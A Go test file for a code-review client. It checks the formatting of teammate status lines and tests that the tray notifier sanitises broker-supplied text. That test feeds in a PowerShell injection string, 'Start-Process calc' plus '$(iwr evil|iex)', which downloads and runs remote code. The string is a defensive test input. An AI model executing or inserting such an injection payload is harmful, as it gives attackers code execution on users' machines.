package main

import (
	"strings"
	"testing"

	"github.com/goldquality/cross-review/internal/client"
)

func TestTeamLines(t *testing.T) {
	team := client.Team{
		Online: []client.Teammate{{Name: "аня", State: "busy"}, {Name: "Georgiy", State: "free"}, {Name: "Маша", State: "paused"}, {Name: "Петя", State: "offered"}},
		Top:    []client.Teammate{{Name: "Петя", Balance: 7}, {Name: "Georgiy", Balance: 3}},
	}
	online, top := teamLines(team, "georgiy")
	if got := strings.Join(online, "|"); got != "аня · ревьюит|Georgiy (ты) · свободен|Маша · пауза|Петя · думает над запросом" {
		t.Fatal(got)
	}
	if got := strings.Join(top, "|"); got != "1. Петя — 7|2. Georgiy (ты) — 3" {
		t.Fatal(got)
	}
}

func TestTrayNotifierCleansBrokerText(t *testing.T) {
	defer func(f func(string, string)) { systemNotify = f }(systemNotify)
	var got []string
	systemNotify = func(title, text string) { got = append(got, title, text) }
	// Имя просящего пришло от брокера: на Windows оно попало бы в скрипт PowerShell.
	trayNotifier{}.Notify(appTitle, "x\n\"@\nStart-Process calc\n$(iwr evil|iex) просит ревью shop!9")
	if strings.ContainsAny(strings.Join(got, ""), "$`\"\n") {
		t.Fatalf("в уведомление ушло: %q", got)
	}
}
